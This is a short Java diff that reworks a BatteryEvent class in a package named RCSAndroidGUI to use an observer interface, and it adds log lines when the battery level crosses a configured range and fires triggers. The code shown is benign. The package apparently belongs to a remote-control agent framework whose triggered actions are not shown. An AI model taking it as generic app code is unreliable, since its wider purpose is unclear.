@@ -3,30 +3,29 @@ package com.ht.RCSAndroidGUI.event;
 import java.io.IOException;
 
 import android.util.Log;
-import android.widget.Toast;
 
+import com.ht.RCSAndroidGUI.AcListener;
 import com.ht.RCSAndroidGUI.Battery;
+import com.ht.RCSAndroidGUI.BatteryListener;
 import com.ht.RCSAndroidGUI.Status;
+import com.ht.RCSAndroidGUI.interfaces.Observer;
 import com.ht.RCSAndroidGUI.utils.DataBuffer;
 
-public class BatteryEvent extends EventBase {
+public class BatteryEvent extends EventBase implements Observer<Battery> {
 	/** The Constant TAG. */
 	private static final String TAG = "BatteryEvent";
-		
-	private Status status;
+
 	private int exitAction, minLevel, maxLevel;
 	private boolean inRange = false;
 	
 	@Override
 	public void begin() {
-		status = Status.self();
-		
-		status.attachToBattery(this);
+		BatteryListener.self().attach(this);
 	}
 
 	@Override
 	public void end() {
-		status.detachFromBattery(this);
+		BatteryListener.self().detach(this);
 	}
 
 	@Override
@@ -55,7 +54,7 @@ public class BatteryEvent extends EventBase {
 		// TODO Auto-generated method stub
 	}
 
-	public void batteryNotification(Battery b) {
+	public void notification(Battery b) {
 		Log.d("QZ", TAG + " Got battery notification: " + b.getBatteryLevel() + "%");
 		
 		if (minLevel > maxLevel)
@@ -64,14 +63,14 @@ public class BatteryEvent extends EventBase {
 		// Nel range
 		if ((b.getBatteryLevel() >= minLevel && b.getBatteryLevel() <= maxLevel) && inRange == false) {
 			inRange = true;
-
+			Log.d("QZ", TAG + " Battery IN");
 			trigger();
 		}
      
 		// Fuori dal range
 		if ((b.getBatteryLevel() < minLevel || b.getBatteryLevel() > maxLevel) && inRange == true) {
 			inRange = false;
-
+			Log.d("QZ", TAG + " Battery OUT");
 			trigger(exitAction);
 		}
 	}
